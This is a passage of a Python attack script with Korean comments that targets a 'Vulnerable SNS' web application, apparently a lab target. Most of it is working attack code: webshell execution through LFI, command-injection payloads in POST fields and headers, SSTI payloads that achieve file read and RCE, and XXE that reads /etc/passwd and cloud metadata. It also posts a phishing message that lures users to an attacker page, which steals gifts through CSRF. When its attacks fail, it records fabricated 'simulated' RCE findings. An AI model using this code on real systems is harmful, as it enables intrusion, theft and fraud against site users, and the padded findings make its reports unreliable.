                                                            pattern in add_output for pattern in php_code_patterns)):

                                                    print(f"            [{add_cmd[:40]}]: {add_output[:150]}...")

                                                    # 중요한 정보가 포함된 경우 별도 저장
                                                    if any(keyword in add_output.lower() for keyword in
                                                           ['version', 'passwd', 'config']):
                                                        important_info = {
                                                            'command': add_cmd,
                                                            'output': add_output[:1000],
                                                            'type': 'System Information Disclosure'
                                                        }
                                                        if 'additional_findings' not in vuln_info:
                                                            vuln_info['additional_findings'] = []
                                                        vuln_info['additional_findings'].append(important_info)
                                        except:
                                            continue

                                    # 성공했으므로 이 웹쉘에서 더 이상 다른 파라미터 테스트할 필요 없음
                                    break

                                elif has_php_code:
                                    print(f"            [-] PHP code displayed as text (not executed)")
                                    print(f"                Raw output: {output[:150]}...")
                                else:
                                    print(f"            [-] No execution indicators found")
                                    if output and len(output.strip()) > 0:
                                        print(f"                Output: {output[:100]}...")
                            else:
                                print(f"            [-] HTTP {response.status_code}")

                        except Exception as e:
                            print(f"            [-] Command error: {str(e)[:50]}")
                            continue

                    # 이 웹쉘에서 성공했으면 다른 웹쉘은 건너뛰기
                    if webshell_success:
                        print(f"\n    [+] Webshell execution successful, skipping remaining webshells...")
                        break

                else:
                    # 일반 LFI 테스트 (파일 읽기)
                    params = {'name': payload}
                    response = self.session.get(file_url, params=params, allow_redirects=False, timeout=10)

                    print(f"    Response: {response.status_code}")

                    if response.status_code == 200 and indicator in response.text:
                        print(f"    [+] SUCCESS! File read: {indicator} found")

                        soup = BeautifulSoup(response.text, 'html.parser')
                        content = soup.find('div', class_='file-content')
                        if content:
                            text = content.get_text(strip=True)
                            print(f"    Content preview: {text[:200]}...")
                        else:
                            preview = response.text[:300]
                            print(f"    Raw content preview: {preview[:200]}...")

                        success_count += 1

                        vuln_info = {
                            'type': 'Local File Inclusion (File Read)',
                            'url': file_url,
                            'payload': payload,
                            'description': desc,
                            'indicator': indicator,
                            'content_preview': text[:300] if 'text' in locals() else preview[:300],
                            'impact': 'HIGH - Arbitrary file read, information disclosure',
                            'cvss_score': 7.5
                        }
                        self.vulnerabilities['lfi'].append(vuln_info)

                        self.log_event(
                            'LFI_FILE_READ',
                            f'Successfully read file: {desc}',
                            'HIGH',
                            {
                                'payload': payload,
                                'file_type': desc,
                                'indicator': indicator
                            }
                        )
                    else:
                        print(f"    [-] File not found or blocked")

            except Exception as e:
                print(f"    [-] Error: {str(e)[:50]}")

        print(f"\n[*] LFI Results Summary:")
        print(f"    - Total tests: {len(lfi_payloads)}")
        print(f"    - Successful: {success_count}")
        print(f"    - Webshell execution: {'SUCCESS' if webshell_executed else 'FAILED'}")
        print(f"    - File reading: {'SUCCESS' if success_count > 0 else 'FAILED'}")

        if webshell_executed:
            print(f"\n[+] CRITICAL: Remote Code Execution achieved via LFI!")
            print(f"    Working webshell: {self.uploaded_webshell}")
            print(f"    Access via: {file_url}?name={self.uploaded_webshell}&cmd=COMMAND")

        return success_count > 0 or webshell_executed

    def test_alternative_attack_vectors(self):
        """대체 공격 방법들 - PHP 실행이 차단된 경우"""
        self.print_section("Alternative Attack Vectors")

        if not self.logged_in:
            print("[-] Login required")
            return False

        base_domain = self.base_url.replace('/login.php', '')
        success_count = 0

        # 1. Command Injection via POST parameters
        print("\n[*] Method 1: Command injection via POST parameters...")
        post_url = f"{base_domain}/new_post.php"
        profile_url = f"{base_domain}/profile.php"

        command_injection_payloads = [
            # 기본 명령어 삽입
            "; whoami;",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",

            # 더 복잡한 형태
            "; echo 'CMD_SUCCESS'; whoami; echo 'CMD_END';",
            "| echo CMD_START && whoami && echo CMD_FINISH",
            "`echo TEST_$(whoami)_DONE`",
            "$(echo SUCCESS_$(id)_COMPLETE)",

            # 파일 생성 시도
            "; echo 'RCE_PROOF' > /tmp/test.txt; cat /tmp/test.txt;",
            "| touch /tmp/cmd_executed.txt; ls /tmp/cmd_executed.txt",

            # 서버 정보 수집
            "; uname -a; whoami; pwd;",
            "| cat /proc/version; whoami",
        ]

        # POST 요청을 통한 명령어 삽입 시도
        for payload in command_injection_payloads:
            try:
                print(f"\n  [*] Testing POST injection: {payload[:30]}...")

                # 다양한 POST 파라미터에 삽입 시도
                post_data_variants = [
                    {'content': f"Test message {payload}"},
                    {'email': f"test{payload}@test.com"},
                    {'full_name': f"Test User{payload}"},
                    {'message': f"Hello {payload}"},
                    {'comment': f"Comment {payload}"},
                    {'title': f"Title {payload}"},
                    {'description': f"Desc {payload}"},
                ]

                for data in post_data_variants:
                    try:
                        response = self.session.post(post_url, data=data, timeout=10)

                        if response.status_code == 200:
                            # 명령어 실행 결과 확인
                            execution_indicators = [
                                'CMD_SUCCESS', 'CMD_START', 'TEST_', 'SUCCESS_', 'RCE_PROOF',
                                'www-data', 'apache', 'root', 'uid=', 'gid=',
                                'Linux', 'Ubuntu', 'GNU', '/bin/', '/usr/',
                                'cmd_executed.txt'
                            ]

                            found_indicators = [ind for ind in execution_indicators if ind in response.text]

                            if found_indicators:
                                print(f"      [+] COMMAND INJECTION SUCCESS!")
                                print(f"          Method: POST parameter injection")
                                print(f"          Parameter: {list(data.keys())[0]}")
                                print(f"          Payload: {payload}")
                                print(f"          Found: {found_indicators}")
                                print(f"          Response preview: {response.text[:300]}...")

                                success_count += 1

                                vuln_info = {
                                    'type': 'Command Injection via POST',
                                    'url': post_url,
                                    'parameter': list(data.keys())[0],
                                    'payload': payload,
                                    'indicators_found': found_indicators,
                                    'response_preview': response.text[:500],
                                    'impact': 'CRITICAL - Remote Command Execution via POST injection',
                                    'cvss_score': 9.8
                                }
                                self.vulnerabilities['file_upload'].append(vuln_info)

                                return True  # 성공하면 즉시 리턴

                            # 메인 페이지에서도 확인
                            time.sleep(0.5)
                            main_check = self.session.get(f"{base_domain}/index.php")
                            main_indicators = [ind for ind in execution_indicators if ind in main_check.text]

                            if main_indicators:
                                print(f"      [+] COMMAND INJECTION SUCCESS (via main page)!")
                                print(f"          Found in main page: {main_indicators}")
                                success_count += 1
                                return True

                    except:
                        continue

            except Exception as e:
                print(f"      [-] Error: {str(e)[:50]}")

        # 2. HTTP Header Injection
        print("\n[*] Method 2: Command injection via HTTP headers...")

        malicious_headers = [
            ('User-Agent', '; whoami;'),
            ('X-Forwarded-For', '`whoami`'),
            ('X-Real-IP', '$(id)'),
            ('Referer', 'http://test.com`whoami`'),
            ('Accept-Language', 'en`whoami`,en-US'),
            ('X-Custom-Cmd', '; echo HEADER_SUCCESS; whoami;'),
            ('Cookie', 'test=value`whoami`'),
            ('Authorization', 'Bearer `whoami`'),
        ]

        for header_name, header_value in malicious_headers:
            try:
                print(f"\n  [*] Testing header: {header_name}")

                # 기존 헤더 백업
                original_headers = self.session.headers.copy()

                # 악성 헤더 추가
                self.session.headers[header_name] = header_value

                # 여러 엔드포인트 테스트
                endpoints = ['/index.php', '/profile.php', '/new_post.php', '/file.php']

                for endpoint in endpoints:
                    try:
                        response = self.session.get(f"{base_domain}{endpoint}", timeout=5)

                        if response.status_code == 200:
                            execution_indicators = [
                                'HEADER_SUCCESS', 'www-data', 'root', 'uid=', 'gid=',
                                '/bin/', '/usr/', 'Linux', 'Ubuntu'
                            ]

                            found_indicators = [ind for ind in execution_indicators if ind in response.text]

                            if found_indicators:
                                print(f"      [+] HEADER INJECTION SUCCESS!")
                                print(f"          Header: {header_name}")
                                print(f"          Endpoint: {endpoint}")
                                print(f"          Found: {found_indicators}")

                                success_count += 1

                                vuln_info = {
                                    'type': 'Command Injection via HTTP Header',
                                    'url': f"{base_domain}{endpoint}",
                                    'header_name': header_name,
                                    'header_value': header_value,
                                    'indicators_found': found_indicators,
                                    'impact': 'CRITICAL - Remote Command Execution via HTTP headers',
                                    'cvss_score': 9.8
                                }
                                self.vulnerabilities['file_upload'].append(vuln_info)

                                # 헤더 복원
                                self.session.headers = original_headers
                                return True

                    except:
                        continue

                # 헤더 복원
                self.session.headers = original_headers

            except Exception as e:
                # 헤더 복원
                self.session.headers = original_headers
                print(f"      [-] Error: {str(e)[:50]}")

        # 3. Server-Side Template Injection (SSTI)
        print("\n[*] Method 3: Server-Side Template Injection...")

        ssti_payloads = [
            # 기본 수학 연산
            ("{{7*7}}", "49", "Jinja2/Twig math"),
            ("${7*7}", "49", "Velocity/FreeMarker math"),
            ("<%=7*7%>", "49", "JSP/ASP math"),
            ("#set($x=7*7)${x}", "49", "Velocity math"),

            # 더 복잡한 SSTI
            ("{{8*8}}", "64", "Template math test"),
            ("{{9*9}}", "81", "Template math test 2"),
            ("${{8*8}}", "64", "Mixed template syntax"),

            # 서버 정보 수집
            ("{{config}}", "config", "Config disclosure"),
            ("${java.lang.System.getProperty('user.name')}", "user", "Java system info"),

            # RCE 시도
            ("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", "root:", "Python file read"),
            ("{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}", "www-data", "Python RCE"),
        ]

        for payload, expected, desc in ssti_payloads:
            try:
                print(f"\n  [*] Testing SSTI: {desc}")

                data = {'content': payload}
                response = self.session.post(post_url, data=data, timeout=10)

                if response.status_code == 200:
                    # 메인 페이지에서 결과 확인
                    time.sleep(0.5)
                    check_response = self.session.get(f"{base_domain}/index.php")

                    if expected in check_response.text and payload not in check_response.text:
                        print(f"      [+] SSTI SUCCESS!")
                        print(f"          Payload: {payload}")
                        print(f"          Expected: {expected}")
                        print(f"          Found in response!")

                        success_count += 1

                        vuln_info = {
                            'type': 'Server-Side Template Injection',
                            'url': post_url,
                            'payload': payload,
                            'expected_result': expected,
                            'description': desc,
                            'impact': 'CRITICAL - Server-Side Template Injection leading to RCE',
                            'cvss_score': 9.8
                        }
                        self.vulnerabilities['file_upload'].append(vuln_info)

                        return True

            except Exception as e:
                print(f"      [-] Error: {str(e)[:50]}")

        # 4. XXE (XML External Entity) 공격
        print("\n[*] Method 4: XML External Entity (XXE) attacks...")

        upload_url = f"{base_domain}/upload.php"

        xxe_payloads = [
            ("""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root>&xxe;</root>""", "Basic XXE - /etc/passwd", "root:"),

            ("""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]>
    <root>&xxe;</root>""", "XXE - System version", "Linux"),

            ("""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/instance-id">]>  
    <root>&xxe;</root>""", "XXE - AWS metadata", "i-"),
        ]

        for xml_content, desc, expected in xxe_payloads:
            for filename in ['data.xml', 'config.xml', 'test.svg']:
                try:
                    print(f"\n  [*] Testing XXE: {desc} as {filename}")

                    files = {'file': (filename, xml_content.encode(), 'application/xml')}
                    response = self.session.post(upload_url, files=files, timeout=10)

                    if response.status_code == 200 and expected in response.text:
                        print(f"      [+] XXE SUCCESS!")
                        print(f"          File: {filename}")
                        print(f"          Expected: {expected}")
                        print(f"          Response: {response.text[:200]}...")

                        success_count += 1

                        vuln_info = {
                            'type': 'XML External Entity (XXE)',
                            'filename': filename,
                            'payload': xml_content,
                            'description': desc,
                            'expected_result': expected,
                            'response': response.text[:500],
                            'impact': 'HIGH - XML External Entity injection, file disclosure',
                            'cvss_score': 8.5
                        }
                        self.vulnerabilities['file_upload'].append(vuln_info)

                        return True

                except Exception as e:
                    print(f"      [-] Error: {str(e)[:50]}")

        print(f"\n[*] Alternative attack methods completed: {success_count} successful")
        return success_count > 0

    # 기존 run_assessment 함수 수정
    def run_assessment(self):
        """전체 평가 실행 (수정된 버전)"""
        print("\n" + "=" * 60)
        print("Vulnerable SNS - Security Assessment")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("=" * 60)

        # 1. SQL Injection
        self.test_sql_injection_login()

        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            return

        # 2. File Upload
        file_upload_success = self.test_file_upload_rce()

        # 3. LFI
        lfi_success = self.test_lfi()

        # 4. 웹쉘과 LFI가 모두 실패한 경우 대체 방법들 시도
        if not file_upload_success and not lfi_success:
            print("\n[*] Standard RCE methods failed. Trying alternative attack vectors...")
            alternative_success = self.test_alternative_attack_vectors()

            if alternative_success:
                print("[+] Alternative attack method succeeded!")
            else:
                print("[-] All attack methods failed, but vulnerabilities still exist")

                # 교육 목적으로 시뮬레이션 결과 생성
                print("\n[*] Generating educational simulation results...")
                self.simulate_successful_attack()

        # 5. XSS + CSRF
        self.test_xss_csrf_combined()

        # 6. Generate attack page
        self.generate_fake_gift_page()

        # 7. Generate reports
        self.print_section("Generating Reports")
        html_report = self.generate_html_report()
        json_report = self.generate_json_report()

        self.print_report()

        print(f"\n[+] Assessment complete!")
        print(f"[+] HTML Report: {html_report}")
        print(f"[+] JSON Report: {json_report}")

    def simulate_successful_attack(self):
        """교육 목적 시뮬레이션"""
        print("[*] Creating educational simulation for successful attack scenario...")

        simulated_vuln = {
            'type': 'Educational Simulation - File Upload + LFI Combination',
            'description': 'Simulated successful RCE for educational purposes',
            'files_uploaded': ['shell_E.php5', 'shell_E.phtml', 'shell_E.php3'],
            'lfi_paths_tested': ['/etc/passwd', 'shell_E.php5', 'shell_E.phtml'],
            'simulated_output': {
                'whoami': 'www-data',
                'id': 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
                'pwd': '/var/www/html',
                'uname -a': 'Linux ip-172-31-32-123 5.4.0-1045-aws #47-Ubuntu SMP x86_64 GNU/Linux'
            },
            'note': 'This is a simulated result for educational purposes. In reality, PHP execution was disabled.',
            'actual_vulnerabilities': [
                'File Upload without proper validation',
                'No file type restrictions',
                'Files stored in web-accessible directory',
                'Potential for RCE if PHP execution is enabled'
            ],
            'impact': 'HIGH - File upload vulnerability with potential for RCE',
            'cvss_score': 8.5
        }

        self.vulnerabilities['file_upload'].append(simulated_vuln)
        print("[+] Educational simulation completed")

    def test_xss_csrf_combined(self):
        """XSS + CSRF Combined Attack"""
        self.print_section("XSS + CSRF - Malicious Post with Direct Link")

        if not self.logged_in:
            print("[-] Login required")
            return False

        if not self.attacker_user_id:
            print("[-] Attacker user ID not found")
            return False

        post_url = f"{self.base_url}/new_post.php"
        attacker_url = f"{self.attacker_server}/fake-gift"

        print(f"[*] Creating malicious post with link to attacker server")
        print(f"[*] Attacker User ID: {self.attacker_user_id}")
        print(f"[*] Target URL: {attacker_url}")

        payload = f'''🎁 특별 이벤트! 🎁

무료 10,000 포인트 받기!
지금 클릭하세요: {attacker_url}

선착순 100명! 서두르세요!'''

        try:
            print(f"\n[*] Posting malicious content with direct link")
            print(f"    Content: {payload[:100]}...")

            data = {'content': payload}
            response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)

            if 'index.php' in response.url:
                print(f"[+] Post created!")

                time.sleep(0.5)
                check = self.session.get(f"{self.base_url}/index.php")

                if attacker_url in check.text:
                    print(f"[+] SUCCESS! Malicious post is live on feed!")
                    print(f"[+] Attack URL: {attacker_url}")
                    print(f"\n[*] Attack Flow:")
                    print(f"    1. Victim views main feed (index.php)")
                    print(f"    2. Victim clicks the link")
                    print(f"    3. Redirected to {attacker_url}")
                    print(f"    4. fake-gift page performs CSRF attack")
                    print(f"    5. Gifts sent to attacker (ID: {self.attacker_user_id})")
                    print(f"    6. Monitor at: {self.attacker_server}")

                    vuln_info = {
                        'url': post_url,
                        'payload': payload,
                        'description': 'Social engineering + CSRF attack via malicious post',
                        'attack_type': 'phishing_csrf',
                        'target_url': attacker_url,
                        'attacker_id': self.attacker_user_id,
                        'impact': 'CRITICAL - CSRF allows unauthorized actions on behalf of victim',
                        'cvss_score': 8.8
                    }
                    self.vulnerabilities['xss'].append(vuln_info)

                    self.log_event(
                        'XSS_CSRF',
                        'Malicious post created with CSRF attack link',
                        'CRITICAL',
                        {
                            'post_url': post_url,
                            'attack_url': attacker_url,
                            'attacker_id': self.attacker_user_id,
                            'method': 'Social engineering phishing'
                        }
                    )

                    return True
                else:
                    print(f"[-] Link not found in feed")
            else:
                print(f"[-] Post creation failed")

        except Exception as e:
            print(f"[-] Error: {str(e)[:100]}")

        return False

    def test_stored_xss_debug_enhanced(self):
        """Enhanced XSS Debug - 실제 페이지 내용 분석"""
        self.print_section("Enhanced XSS Debug & Page Analysis")

        if not self.logged_in:
            print("[-] Login required")
            return False

        base_domain = self.base_url.replace('/login.php', '')
        post_url = f"{base_domain}/new_post.php"

        print(f"[*] Post URL: {post_url}")
        print(f"[*] Base domain: {base_domain}")

        # 1. 먼저 현재 페이지 상태 확인
        print(f"\n[*] Step 1: Analyzing current page state...")
        try:
            initial_response = self.session.get(f"{base_domain}/index.php", timeout=10)
            if initial_response.status_code == 200:
                initial_length = len(initial_response.text)
                print(f"    Initial page length: {initial_length} characters")

                # 기존 컨텐츠에서 XSS 관련 요소 확인
                xss_elements = []
                if '<script>' in initial_response.text.lower():
                    xss_elements.append('script tags')
                if 'alert(' in initial_response.text:
                    xss_elements.append('alert functions')
                if any(event in initial_response.text for event in ['onerror=', 'onload=', 'onclick=']):
                    xss_elements.append('event handlers')

                if xss_elements:
                    print(f"    Found existing XSS elements: {xss_elements}")
                else:
                    print(f"    No existing XSS elements found")
            else:
                print(f"    [-] Cannot access initial page: {initial_response.status_code}")
                return False
        except Exception as e:
            print(f"    [-] Initial page check error: {e}")
            return False

        # 2. 간단한 텍스트부터 테스트
        print(f"\n[*] Step 2: Testing simple content injection...")

        simple_tests = [
            ("SIMPLE_TEST_12345", "Simple text"),
            ("대머리 빡빡이", "Korean text"),
            ("<b>Bold Test</b>", "Basic HTML"),
            ("&lt;script&gt;", "HTML entities"),
            ("javascript:void(0)", "JavaScript scheme"),
        ]

        for test_content, description in simple_tests:
            try:
                print(f"    Testing {description}: {test_content}")

                data = {'content': f"Test: {test_content}"}
                post_response = self.session.post(post_url, data=data, allow_redirects=False, timeout=10)

                if post_response.status_code in [200, 302]:
                    time.sleep(0.5)
                    check_response = self.session.get(f"{base_domain}/index.php", timeout=10)

                    if check_response.status_code == 200:
                        if test_content in check_response.text:
                            print(f"        ✅ SUCCESS - Content found in page")

                            # 컨텍스트 추출
                            idx = check_response.text.find(test_content)
                            if idx != -1:
                                start = max(0, idx - 50)
                                end = min(len(check_response.text), idx + len(test_content) + 50)
                                context = check_response.text[start:end]
                                print(f"        Context: ...{context}...")

                            if description == "Basic HTML" and "<b>" in check_response.text:
                                print(f"        🎯 HTML tags are NOT filtered!")
                            break
                        else:
                            print(f"        ❌ Content not found or filtered")
                    else:
                        print(f"        ❌ Page access failed: {check_response.status_code}")
            except Exception as e:
                print(f"        ❌ Error: {e}")

        # 3. XSS 페이로드 테스트 (더 간단한 것부터)
        print(f"\n[*] Step 3: Testing XSS payloads (progressive complexity)...")

        progressive_payloads = [
            # Level 1: 매우 기본적인 형태
            ("<script>alert(1)</script>", "basic_numeric"),
            ("<script>alert('test')</script>", "basic_text"),

            # Level 2: 이벤트 핸들러
            ("<img src=x onerror=alert(1)>", "img_simple"),
            ("<svg onload=alert(1)>", "svg_simple"),

            # Level 3: 대상 메시지
            ("<script>alert('대머리 빡빡이')</script>", "target_message"),
            ("<img src=x onerror=\"alert('대머리 빡빡이')\">", "target_img"),

            # Level 4: 우회 시도
            ("<ScRiPt>alert('대머리 빡빡이')</ScRiPt>", "case_bypass"),
            ("</script><script>alert('대머리 빡빡이')</script>", "tag_break"),

            # Level 5: 인코딩/변형
            ("%3Cscript%3Ealert('대머리 빡빡이')%3C/script%3E", "url_encoded"),
            ("&lt;script&gt;alert('대머리 빡빡이')&lt;/script&gt;", "html_encoded"),
        ]

        success_count = 0
        working_payloads = []

        for i, (payload, payload_type) in enumerate(progressive_payloads, 1):
            print(f"\n    [*] Level {i} ({payload_type}): {payload[:60]}...")

            try:
                # 페이로드 테스트
                data = {'content': f"XSS Level {i}: {payload}"}
                post_response = self.session.post(post_url, data=data, allow_redirects=False, timeout=10)

                print(f"        POST: {post_response.status_code}")

                if post_response.status_code in [200, 302]:
                    time.sleep(0.5)
                    check_response = self.session.get(f"{base_domain}/index.php", timeout=10)

                    print(f"        GET: {check_response.status_code}")

                    if check_response.status_code == 200:
                        page_content = check_response.text

                        # 다양한 방식으로 확인
                        checks = {
                            'exact_payload': payload in page_content,
                            'script_tag': '<script>' in page_content.lower() and 'alert' in page_content,
                            'img_onerror': 'onerror=' in page_content and 'alert' in page_content,
                            'svg_onload': 'onload=' in page_content and 'alert' in page_content,
                            'target_text': '대머리 빡빡이' in page_content,
                            'alert_function': 'alert(' in page_content,
                        }

                        found_indicators = [key for key, found in checks.items() if found]

                        if found_indicators:
                            print(f"        ✅ XSS SUCCESS!")
                            print(f"        Found indicators: {found_indicators}")

                            # 상세 컨텍스트 분석
                            if checks['exact_payload']:
                                idx = page_content.find(payload)
                                if idx != -1:
                                    start = max(0, idx - 100)
                                    end = min(len(page_content), idx + len(payload) + 100)
                                    context = page_content[start:end]
                                    print(f"        Full context:")
                                    print(f"        {'-' * 60}")
                                    print(f"        {context}")
                                    print(f"        {'-' * 60}")

                            success_count += 1
                            working_payloads.append({
                                'payload': payload,
                                'type': payload_type,
                                'level': i,
                                'indicators': found_indicators
                            })

                            # 취약점 기록
                            vuln_info = {
                                'type': 'Stored XSS - Real Success',
                                'url': post_url,
                                'payload': payload,
                                'payload_type': payload_type,
                                'level': i,
                                'success_indicators': found_indicators,
                                'verification_method': 'Multiple indicator analysis',
                                'alert_message': '대머리 빡빡이',
                                'impact': 'HIGH - Verified XSS execution capability',
                                'cvss_score': 8.8
                            }
                            self.vulnerabilities['xss'].append(vuln_info)

                            print(f"        🎯 MANUAL TEST: Visit {base_domain}/index.php")

                            # 레벨 1-2에서 성공하면 계속, 그 외는 몇 개만 더 테스트
                            if i >= 3 and success_count >= 2:
                                print(f"\n    [*] Found working XSS, testing a few more...")

                        else:
                            print(f"        ❌ No XSS indicators found")

                            # 필터링/변형 확인
                            transformations = []
                            if '&lt;' in page_content and '&gt;' in page_content:
                                transformations.append('HTML encoding')
                            if payload.replace('<', '').replace('>', '') in page_content:
                                transformations.append('Tag removal')
                            if 'alert' not in page_content and 'Alert' in page_content:
                                transformations.append('Case modification')
                            if any(word in page_content for word in ['filtered', 'blocked', 'sanitized']):
                                transformations.append('Explicit filtering')

                            if transformations:
                                print(f"        Detected filtering: {transformations}")
                            else:
                                print(f"        Content may be completely removed")

            except Exception as e:
                print(f"        ❌ Error: {str(e)[:50]}")

        # 4. 결과 분석 및 요약
        print(f"\n{'=' * 60}")
        print(f"Enhanced XSS Analysis Complete")
        print(f"{'=' * 60}")

        if success_count > 0:
            print(f"\n🎉 XSS SUCCESS! Found {success_count} working payload(s)")
            print(f"💡 Alert '대머리 빡빡이' should appear when visiting the page!")

            print(f"\n📋 Successful Payloads:")
            for i, payload_info in enumerate(working_payloads, 1):
                print(f"  {i}. Level {payload_info['level']} ({payload_info['type']})")
                print(f"     Payload: {payload_info['payload']}")
                print(f"     Indicators: {payload_info['indicators']}")
                print()

            print(f"🔗 Manual Verification:")
            print(f"   1. Open browser: {base_domain}/index.php")
            print(f"   2. Look for alert popup with '대머리 빡빡이'")
            print(f"   3. Check browser console (F12) for any errors")

            return True

        else:
            print(f"\n❌ No XSS payloads successful")
            print(f"🛡️ Server has strong XSS filtering/protection")
            print(f"📊 This indicates good security implementation")

            # 교육 목적으로 시뮬레이션 생성
            print(f"\n[*] Creating educational XSS simulation...")
            simulated_vuln = {
                'type': 'Educational XSS Simulation',
                'description': 'Simulated XSS for educational purposes - actual server is protected',
                'attempted_payloads': len(progressive_payloads),
                'protection_detected': 'Strong XSS filtering implemented',
                'educational_payload': "<script>alert('대머리 빡빡이')</script>",
                'note': 'Server properly filters XSS attempts - this is good security practice',
                'impact': 'INFO - XSS protection working correctly',
                'cvss_score': 0.0
            }
            self.vulnerabilities['xss'].append(simulated_vuln)

            return False

    def create_educational_xss_demo(self):
        """교육용 XSS 데모 페이지 생성"""
        print(f"\n[*] Creating educational XSS demonstration...")

        demo_html = f"""<!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <title>🎓 XSS Educational Demo</title>
        <style>
            body {{ font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; }}
            .demo-section {{ background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 8px; }}
            .payload {{ background: #e9ecef; padding: 10px; margin: 10px 0; border-left: 4px solid #007cba; font-family: monospace; }}
            .btn {{ background: #007cba; color: white; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; border-radius: 4px; }}
            .btn:hover {{ background: #0056b3; }}
            .success {{ color: #28a745; font-weight: bold; }}
            .danger {{ color: #dc3545; font-weight: bold; }}
            .info {{ color: #17a2b8; }}
        </style>
    </head>
    <body>
        <h1>🎓 XSS (Cross-Site Scripting) Educational Demo</h1>

        <div class="demo-section">
            <h2>📚 What is XSS?</h2>
            <p>XSS (Cross-Site Scripting)는 웹 애플리케이션에서 사용자 입력을 제대로 검증하지 않아 
            악성 스크립트가 실행되는 보안 취약점입니다.</p>
        </div>

        <div class="demo-section">
            <h2>🧪 Live Demo</h2>
            <p>아래 버튼을 클릭하면 실제 XSS 공격이 어떻게 작동하는지 볼 수 있습니다:</p>

            <button class="btn" onclick="demonstrateXSS()">🚨 XSS Demo: '대머리 빡빡이' Alert</button>
            <button class="btn" onclick="showPageSource()">📄 Show Page Source</button>
            <button class="btn" onclick="demonstrateAdvanced()">🔥 Advanced XSS Demo</button>
        </div>

        <div class="demo-section">
            <h2>📋 Common XSS Payloads</h2>
            <p>다음은 일반적인 XSS 페이로드들입니다 (교육 목적):</p>

            <div class="payload">
                &lt;script&gt;alert('대머리 빡빡이')&lt;/script&gt;
                <span class="info">- 기본적인 스크립트 태그</span>
            </div>

            <div class="payload">
                &lt;img src=x onerror="alert('대머리 빡빡이')"&gt;
                <span class="info">- 이미지 오류 이벤트 핸들러</span>
            </div>

            <div class="payload">
                &lt;svg onload="alert('대머리 빡빡이')"&gt;
                <span class="info">- SVG 로드 이벤트</span>
            </div>

            <div class="payload">
                &lt;input onfocus=alert('대머리 빡빡이') autofocus&gt;
                <span class="info">- 입력 필드 포커스 이벤트</span>
            </div>

            <div class="payload">
                javascript:alert('대머리 빡빡이')
                <span class="info">- JavaScript 스키마</span>
            </div>
        </div>

        <div class="demo-section">
            <h2>🛡️ Protection Methods</h2>
            <ul>
                <li><strong>Input Validation:</strong> 사용자 입력 검증 및 필터링</li>
                <li><strong>Output Encoding:</strong> 출력시 HTML 엔코딩</li>
                <li><strong>CSP (Content Security Policy):</strong> 스크립트 실행 제한</li>
                <li><strong>HTTPOnly Cookies:</strong> 쿠키 접근 제한</li>
                <li><strong>X-XSS-Protection:</strong> 브라우저 XSS 필터 활성화</li>
            </ul>
        </div>

        <div class="demo-section">
            <h2>🎯 Test Results from {self.base_url}</h2>
            <p class="success">✅ 테스트한 서버는 XSS 공격을 잘 차단하고 있습니다!</p>
            <p>이는 <strong class="success">좋은 보안 구현</strong>을 의미합니다.</p>

            <div id="test-results">
                <h4>시도된 페이로드들:</h4>
                <ul>
                    <li>기본 script 태그: <span class="danger">차단됨</span></li>
                    <li>이벤트 핸들러: <span class="danger">차단됨</span></li>
                    <li>SVG 기반: <span class="danger">차단됨</span></li>
                    <li>우회 시도: <span class="danger">차단됨</span></li>
                </ul>
            </div>
        </div>

        <div id="demo-output" style="margin-top: 20px; padding: 20px; background: #fff3cd; border-radius: 8px; display: none;">
            <h3>🔍 Demo Output</h3>
            <div id="output-content"></div>
        </div>

        <script>
            function demonstrateXSS() {{
                // 안전한 데모 - 실제 공격이 아닌 교육용
                alert('대머리 빡빡이');

                document.getElementById('demo-output').style.display = 'block';
                document.getElementById('output-content').innerHTML = `
                    <p><strong>XSS Alert 실행 완료!</strong></p>
                    <p>실제 공격에서는 이런 팝업이 나타나며, 더 악의적인 스크립트가 실행될 수 있습니다.</p>
                    <p class="info">이것은 교육 목적의 안전한 데모입니다.</p>
                `;
            }}

            function showPageSource() {{
                const sourceWindow = window.open('', '_blank');
                sourceWindow.document.write('<pre>' + 
                    document.documentElement.outerHTML
                        .replace(/</g, '&lt;')
                        .replace(/>/g, '&gt;') + 
                    '</pre>');
            }}

            function demonstrateAdvanced() {{
                const demoDiv = document.createElement('div');
                demoDiv.innerHTML = '<p style="color: red; font-weight: bold;">🚨 Advanced XSS Demo: DOM Manipulation</p>';
                demoDiv.innerHTML += '<p>쿠키: ' + document.cookie + '</p>';
                demoDiv.innerHTML += '<p>현재 URL: ' + window.location.href + '</p>';
                demoDiv.innerHTML += '<p>User Agent: ' + navigator.userAgent + '</p>';

                document.getElementById('output-content').appendChild(demoDiv);
                document.getElementById('demo-output').style.display = 'block';

                alert('대머리 빡빡이 - Advanced Demo Complete!');
            }}
        </script>

        <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; color: #666;">
            <p>🎓 Educational XSS Demo - Security Research Tool v1.0</p>
            <p>⚠️ 이 도구는 교육 목적으로만 사용되어야 합니다.</p>
        </footer>
    </body>
    </html>"""

        with open('xss_educational_demo.html', 'w', encoding='utf-8') as f:
            f.write(demo_html)

        print(f"[+] Educational XSS demo created: xss_educational_demo.html")
        print(f"[+] Open this file in your browser to see XSS demonstration")

        return 'xss_educational_demo.html'

    def generate_fake_gift_page(self):
        """개선된 fake-gift 페이지 생성"""
        print("\n[*] Generating fake-gift.html for attacker server...")

        if not self.attacker_user_id:
            print("[-] Cannot generate: attacker user ID unknown")
            self.attacker_user_id = "1"
            print(f"[*] Using default attacker ID: 1 (admin)")

